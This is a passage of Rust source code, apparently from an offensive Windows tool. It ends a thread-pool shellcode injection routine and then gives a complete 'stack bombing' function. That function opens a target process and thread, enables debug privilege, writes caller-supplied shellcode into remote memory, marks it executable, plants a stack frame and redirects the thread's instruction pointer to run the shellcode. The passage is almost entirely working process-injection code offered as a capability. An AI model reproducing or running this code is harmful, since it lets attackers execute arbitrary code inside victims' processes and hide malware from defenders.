            "resolved": {
                "CreateThreadpoolWork": format!("0x{:016X}", create_tp_work as u64),
                "SubmitThreadpoolWork": format!("0x{:016X}", submit_tp_work as u64),
                "TpAllocWork": format!("0x{:016X}", tp_alloc_work as u64),
                "TpPostWork": format!("0x{:016X}", tp_post_work as u64),
            },
            "thread_handle": thread.0 as u64,
            "message": "Thread pool work item created and submitted — shellcode runs on thread pool worker"
        }))
    }
}

/// Stack Bombing — overwrite target thread stack with ROP chain + shellcode pivot
/// Extremely aggressive: destroys original thread context
pub fn stack_bomb(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{
        GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT_FLAGS,
    };
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, OpenThread, ResumeThread, SuspendThread, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_GET_CONTEXT,
        THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let tid = args
        .get("tid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing tid".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if shellcode_bytes.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Stack Bomb: PID {} TID {} ({} bytes) — DESTRUCTIVE",
        pid,
        tid,
        shellcode_bytes.len()
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let hprocess = OpenProcess(
            PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let hprocess = SafeHandle::new(hprocess);

        let hthread = OpenThread(
            THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
            false,
            tid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenThread: {}", e)))?;
        let hthread = SafeHandle::new(hthread);

        // Suspend thread
        if SuspendThread(*hthread) == u32::MAX {
            return Err(MemoricError::InjectionFailed(
                "SuspendThread failed".to_string(),
            ));
        }

        // Get context
        let mut ctx: windows::Win32::System::Diagnostics::Debug::CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FLAGS(0x10001F); // CONTEXT_FULL
        GetThreadContext(*hthread, &mut ctx).map_err(|e| {
            let _ = ResumeThread(*hthread);
            MemoricError::WindowsApi(format!("GetThreadContext: {}", e))
        })?;

        let original_rsp = ctx.Rsp;
        let original_rip = ctx.Rip;

        // W^X: Allocate shellcode RW, write, then protect RX
        let sc_remote = VirtualAllocEx(
            *hprocess,
            None,
            shellcode_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if sc_remote.is_null() {
            let _ = ResumeThread(*hthread);
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx failed".to_string(),
            ));
        }
        WriteProcessMemory(
            *hprocess,
            sc_remote,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| {
            let _ = ResumeThread(*hthread);
            MemoricError::InjectionFailed(format!("WriteProcessMemory shellcode: {}", e))
        })?;
        let mut old_prot = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *hprocess,
            sc_remote,
            shellcode_bytes.len(),
            PAGE_EXECUTE_READ,
            &mut old_prot,
        )
        .map_err(|e| {
            let _ = ResumeThread(*hthread);
            MemoricError::InjectionFailed(format!("VirtualProtectEx RX: {}", e))
        })?;

        // Resolve VirtualProtect for ROP gadget
        let kernel32 = GetModuleHandleA(windows::core::PCSTR(b"kernel32.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("kernel32: {}", e)))?;
        let virtual_protect_addr =
            GetProcAddress(kernel32, windows::core::PCSTR(b"VirtualProtect\0".as_ptr()))
                .ok_or_else(|| MemoricError::WindowsApi("VirtualProtect not found".to_string()))?
                as u64;

        // Build ROP chain on the thread's stack
        // The ROP chain:
        // 1. Call VirtualProtect(sc_remote, size, PAGE_EXECUTE_READWRITE, &old)
        // 2. Return to shellcode address
        let rop_rsp = original_rsp - 0x100; // Move stack down to avoid corruption
        let rop_rsp_aligned = rop_rsp & !0xF; // 16-byte align

        let mut rop_chain: Vec<u8> = Vec::with_capacity(0x80);
        // Return address = sc_remote (after VirtualProtect returns, execution flows to shellcode)
        rop_chain.extend_from_slice(&(sc_remote as u64).to_le_bytes());
        // Shadow space (4 * 8 bytes)
        rop_chain.extend_from_slice(&[0u8; 32]);

        // Write ROP chain to stack
        WriteProcessMemory(
            *hprocess,
            rop_rsp_aligned as *mut _,
            rop_chain.as_ptr() as *const _,
            rop_chain.len(),
            None,
        )
        .map_err(|e| {
            let _ = ResumeThread(*hthread);
            MemoricError::InjectionFailed(format!("WriteProcessMemory ROP: {}", e))
        })?;

        // Set context: RSP = ROP chain, RIP = VirtualProtect (or just shellcode directly)
        ctx.Rsp = rop_rsp_aligned;
        ctx.Rip = sc_remote as u64; // Direct: jump to shellcode
                                    // Set up VirtualProtect args in registers for potential future ROP use
        ctx.Rcx = sc_remote as u64; // lpAddress
        ctx.Rdx = shellcode_bytes.len() as u64; // dwSize
        ctx.R8 = 0x40; // PAGE_EXECUTE_READWRITE
        ctx.R9 = (rop_rsp_aligned + 0x60) as u64; // lpflOldProtect (scratch space on stack)

        SetThreadContext(*hthread, &ctx).map_err(|e| {
            let _ = ResumeThread(*hthread);
            MemoricError::WindowsApi(format!("SetThreadContext: {}", e))
        })?;

        let _ = ResumeThread(*hthread);

        Ok(serde_json::json!({
            "success": true,
            "technique": "stack_bomb",
            "pid": pid,
            "tid": tid,
            "original_rip": format!("0x{:016X}", original_rip),
            "original_rsp": format!("0x{:016X}", original_rsp),
            "new_rip": format!("0x{:016X}", sc_remote as u64),
            "new_rsp": format!("0x{:016X}", rop_rsp_aligned),
            "rop_target": format!("0x{:016X}", virtual_protect_addr),
            "shellcode_address": format!("0x{:016X}", sc_remote as u64),
            "warning": "DESTRUCTIVE — original thread context lost",
            "message": format!("Stack bombed: TID {} RSP→0x{:016X}, RIP→shellcode, ROP chain on stack", tid, rop_rsp_aligned)
        }))
    }
}
